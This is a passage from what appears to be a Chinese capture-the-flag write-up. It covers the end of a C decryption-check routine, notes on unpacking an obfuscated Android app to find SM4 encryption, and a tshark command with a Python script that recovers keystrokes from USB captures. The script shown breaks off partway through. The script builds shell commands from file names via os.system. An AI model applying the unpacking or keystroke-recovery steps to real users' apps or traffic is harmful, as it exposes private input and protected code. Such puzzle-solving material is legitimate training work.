punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token punctuation\">(</span>decrypt<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>ccmp<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token punctuation\">(</span>decrypt<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>ccmp<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token punctuation\">(</span>decrypt<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>ccmp<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token punctuation\">(</span>decrypt<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>ccmp<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token punctuation\">(</span>decrypt<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>ccmp<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token punctuation\">(</span>decrypt<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>ccmp<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"581\"></td><td><pre>       <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\"</span><span class=\"token punctuation\">,</span>hexbuf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"582\"></td><td><pre>        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"583\"></td><td><pre>     <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"584\"></td><td><pre>        </pre></td></tr><tr><td data-num=\"585\"></td><td><pre>        </pre></td></tr><tr><td data-num=\"586\"></td><td><pre>        </pre></td></tr><tr><td data-num=\"587\"></td><td><pre>     </pre></td></tr><tr><td data-num=\"588\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"589\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"590\"></td><td><pre></pre></td></tr><tr><td data-num=\"591\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"592\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"593\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"594\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"595\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"596\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"597\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"598\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"599\"></td><td><pre></pre></td></tr><tr><td data-num=\"600\"></td><td><pre>     </pre></td></tr><tr><td data-num=\"601\"></td><td><pre>    <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"602\"></td><td><pre> <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"/images/image-20230716184927439.png\" alt=\"image-20230716184927439\"></p>\n<p><img data-src=\"/images/image-20230716185137499.png\" alt=\"image-20230716185137499\"></p>\n<p>安卓</p>\n<p>jadx 打开没看到 main 突发奇想用查壳看看 (好像有什么不对 感觉很多混淆都被识别成加固了？)</p>\n<p><img data-src=\"/images/image-20230715095548821.png\" alt=\"image-20230715095548821\"></p>\n<p>32 位的</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0NvZGluZ0dheS9CbGFja0RleC9yZWxlYXNlcw==\">https://github.com/CodingGay/BlackDex/releases</span></p>\n<p><img data-src=\"/images/image-20230730232522932.png\" alt=\"image-20230730232522932\"></p>\n<p>脱了之后看不懂</p>\n<p>好像不是这样做？</p>\n<p>大佬说直接看 so 文件的加密然后解密就是 flag 我测</p>\n<p><img data-src=\"/images/image-20230719163820868.png\" alt=\"image-20230719163820868\"></p>\n<p>直接看到 sm4 了…</p>\n<p>再根据安装 APP 跳出的两个字符串直接解密 SM4 就行</p>\n<p><strong>赛后研究一下 SM4 加密</strong></p>\n<h2 id=\"usb流量包分析\"><a class=\"markdownIt-Anchor\" href=\"#usb流量包分析\">#</a> USB 流量包分析</h2>\n<p>USB</p>\n<p><img data-src=\"/images/image-20230715211437406.png\" alt=\"image-20230715211437406\"></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>tshark <span class=\"token parameter variable\">-r</span> misc1.pcapng <span class=\"token parameter variable\">-T</span> fields <span class=\"token parameter variable\">-e</span> usb.capdata <span class=\"token operator\">></span> usbdata.txt</pre></td></tr></table></figure><p>大佬的脚本得到键盘的输入的字符</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> sys<span class=\"token punctuation\">,</span> argparse<span class=\"token punctuation\">,</span> os</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">kbpaser</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            <span class=\"token comment\">#tshark 导出文件</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        self<span class=\"token punctuation\">.</span>datafile<span class=\"token operator\">=</span><span class=\"token string\">\"kbdatafile.txt\"</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        self<span class=\"token punctuation\">.</span>presses<span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token comment\">#Keyboard Traffic Dictionary</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        self<span class=\"token punctuation\">.</span>normalKeys <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"04\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"a\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"05\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"b\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"06\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"c\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"07\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"d\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"08\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"e\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"09\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"f\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"0a\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"g\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"0b\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"h\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"0c\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"i\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"0d\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"j\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"0e\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"k\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"0f\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"l\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"10\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"m\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"11\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"n\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"12\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"o\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"13\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"p\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"14\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"q\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"15\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"r\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"16\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"s\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"17\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"t\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"18\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"u\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"19\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"v\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"1a\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"w\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"1b\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"x\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"1c\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"y\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"1d\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"z\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"1e\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"1f\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"2\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"20\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"3\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"21\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"4\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"22\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"5\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"23\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"6\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"24\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"7\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"25\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"8\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"26\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"9\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"27\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"0\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"28\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;RET>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"29\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;ESC>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"2a\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;DEL>\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"2b\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"\\t\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"2c\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;SPACE>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"2d\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"-\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"2e\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"=\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"2f\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"[\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"30\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"]\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"31\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"\\\\\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"32\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;NON>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"33\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\";\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"34\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"'\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"35\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;GA>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"36\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\",\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"37\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\".\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"38\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"/\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"39\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;CAP>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"3a\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;F1>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"3b\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;F2>\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"3c\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;F3>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"3d\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;F4>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"3e\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;F5>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"3f\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;F6>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"40\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;F7>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"41\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;F8>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"42\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;F9>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"43\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;F10>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"44\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;F11>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"45\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;F12>\"</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token comment\">#Press shift </span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        self<span class=\"token punctuation\">.</span>shiftKeys <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"04\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"A\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"05\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"B\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"06\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"C\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"07\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"D\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"08\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"E\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"09\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"F\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"0a\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"G\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"0b\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"H\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"0c\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"I\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"0d\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"J\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"0e\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"K\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"0f\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"L\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"10\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"M\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"11\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"N\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"12\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"O\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"13\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"P\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"14\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"Q\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"15\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"R\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"16\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"S\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"17\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"T\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"18\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"U\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"19\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"V\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"1a\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"W\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"1b\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"X\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"1c\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"Y\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"1d\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"Z\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"1e\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"!\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"1f\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"@\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"20\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"#\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"21\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"$\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"22\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"%\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"23\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"^\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"24\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&amp;\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"25\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"*\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"26\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"(\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"27\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\")\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"28\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;RET>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"29\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;ESC>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"2a\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;DEL>\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"2b\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"\\t\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"2c\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;SPACE>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"2d\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"_\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"2e\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"+\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"2f\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&#123;\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"30\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&#125;\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"31\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"|\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"32\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;NON>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"33\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"\\\"\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"34\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"35\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;GA>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"36\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"37\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\">\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"38\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"?\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"39\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;CAP>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"3a\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;F1>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"3b\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;F2>\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"3c\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;F3>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"3d\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;F4>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"3e\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;F5>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"3f\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;F6>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"40\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;F7>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"41\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;F8>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"42\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;F9>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"43\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;F10>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"44\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;F11>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"45\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;F12>\"</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">tshark_do</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> pcapfile<span class=\"token punctuation\">,</span> filterfield<span class=\"token punctuation\">,</span> fieldvalue<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">if</span> os<span class=\"token punctuation\">.</span>name <span class=\"token operator\">==</span> <span class=\"token string\">\"nt\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token keyword\">if</span> filterfield <span class=\"token keyword\">is</span> <span class=\"token keyword\">not</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>                command <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"tshark -r </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>pcapfile<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> -Y </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>filterfield<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> -T fields -e </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>fieldvalue<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> > </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>self<span class=\"token punctuation\">.</span>datafile<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                command <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"tshark -r </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>pcapfile<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> -T fields -e </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>fieldvalue<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> > </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>self<span class=\"token punctuation\">.</span>datafile<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                os<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">(</span>command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"tshark执行语句：\"</span> <span class=\"token operator\">+</span> command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+] Found : tshark导出数据成功\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>            <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"tshark执行语句：\"</span> <span class=\"token operator\">+</span> command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>                <span class=\"token 